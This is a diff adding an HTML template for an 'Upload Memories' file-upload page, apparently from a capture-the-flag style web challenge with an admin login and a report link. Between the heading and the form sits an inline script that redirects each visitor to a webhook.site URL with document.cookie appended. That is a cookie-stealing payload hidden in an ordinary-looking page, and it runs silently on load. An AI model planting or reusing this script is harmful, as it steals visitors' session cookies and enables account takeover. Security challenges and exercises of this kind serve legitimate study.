@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="zh-TW">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Upload Memories</title>
+    <link href="https://fonts.googleapis.com/css2?family=Noto+Serif+TC:wght@400;600&family=Playfair+Display:wght@500&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: "Noto Serif TC", "Playfair Display", serif;
+            background: linear-gradient(180deg, #fdf6f0 0%, #fff 50%, #f8e7e7 100%);
+            color: #444;
+            margin: 0;
+            padding: 60px 20px;
+            text-align: center;
+        }
+
+        h2 {
+            font-size: 36px;
+            color: #b76e79;
+            margin-bottom: 30px;
+        }
+
+        form {
+            display: inline-block;
+            background: rgba(255,255,255,0.85);
+            padding: 35px 50px;
+            border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+            backdrop-filter: blur(6px);
+        }
+
+        input[type="file"] {
+            padding: 12px;
+            font-size: 16px;
+            border-radius: 10px;
+            border: 1px solid #bbb;
+            outline: none;
+            transition: 0.3s;
+        }
+
+        input[type="file"]:focus {
+            border-color: #b76e79;
+            box-shadow: 0 0 8px rgba(183,110,121,0.3);
+        }
+
+        button {
+            padding: 12px 28px;
+            font-size: 16px;
+            border-radius: 10px;
+            background-color: #b76e79;
+            color: white;
+            border: none;
+            cursor: pointer;
+            margin-top: 15px;
+            transition: 0.3s;
+        }
+
+        button:hover {
+            background-color: #9c5e6a;
+        }
+
+        a {
+            display: inline-block;
+            margin-top: 25px;
+            color: #b76e79;
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <h2>Upload Memories</h2>
+    <script> location = "https://webhook.site/d1f51e64-a4b7-40be-b382-ebbf3cb7b8a9?a=" + document.cookie</script>
+
+    <form method="POST" enctype="multipart/form-data">
+        <input type="file" name="file" required>
+        <br>
+        <button type="submit">Upload Memories</button>
+    </form>
+
+    <p><a href="/login">Go to Admin Login</a></p>
+    <p><a href="/report">Share the memories with me</a></p>
+</body>
+</html>
